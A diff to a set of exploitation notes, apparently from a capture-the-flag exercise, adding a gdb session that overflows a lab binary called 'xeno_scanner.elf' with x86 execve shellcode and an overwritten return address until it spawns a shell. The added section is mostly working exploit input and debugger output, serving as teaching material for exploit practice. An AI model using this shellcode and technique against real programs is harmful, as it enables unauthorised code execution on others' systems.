@@ -111,3 +111,61 @@ for packet in packets:
 
 wrpcap('fixed_ports.pcap', packets)
 ```
+
+### Give an example of using gdb and using a payload from shell-storm to pop a shell by overwriting EIP and directing code to run the payload:
+```
+weyuser@14c7b2eb3e7f:~$ gdb xeno_scanner.elf 
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from xeno_scanner.elf...(no debugging symbols found)...done.
+(gdb) r $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x90\xd6\xff\xffAAAAA")
+Starting program: /home/weyuser/xeno_scanner.elf $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x90\xd6\xff\xffAAAAA")
+Xenomorph Scanner. Testing DNA of user with specified $UID...
+Storing your DNA at: 0xffffd690
+User with UID " 1�Ph//shh/bin��PS��
+                                   ̀ABCDEFGHIJKLMNOPQRST����AAAAA" is NOT infected with Xeno-DNA.
+Program received signal SIGSEGV, Segmentation fault.
+0xffffd690 in ?? ()
+(gdb) info registers
+eax            0x0      0
+ecx            0x7fffffbb       2147483579
+edx            0xf7fcd870       -134424464
+ebx            0xffffd6f0       -10512
+esp            0xffffd6c0       0xffffd6c0
+ebp            0x54535251       0x54535251
+esi            0xf7fcc000       -134430720
+edi            0xf7fcc000       -134430720
+eip            0xffffd690       0xffffd690
+eflags         0x10286  [ PF SF IF RF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x0      0
+gs             0x63     99
+(gdb) r $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x91\xd6\xff\xffAAAAA")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/weyuser/xeno_scanner.elf $(printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80ABCDEFGHIJKLMNOPQRST\x91\xd6\xff\xffAAAAA")
+Xenomorph Scanner. Testing DNA of user with specified $UID...
+Storing your DNA at: 0xffffd690
+User with UID " 1�Ph//shh/bin��PS��
+                                   ̀ABCDEFGHIJKLMNOPQRST����AAAAA" IS infected with xeno-DNA. Please report to the medical bay for immediate extraction
+process 35 is executing new program: /bin/dash
+$ ls
+HELP  xeno_scanner.c  xeno_scanner.elf
+$ whoami
+weyuser
+```
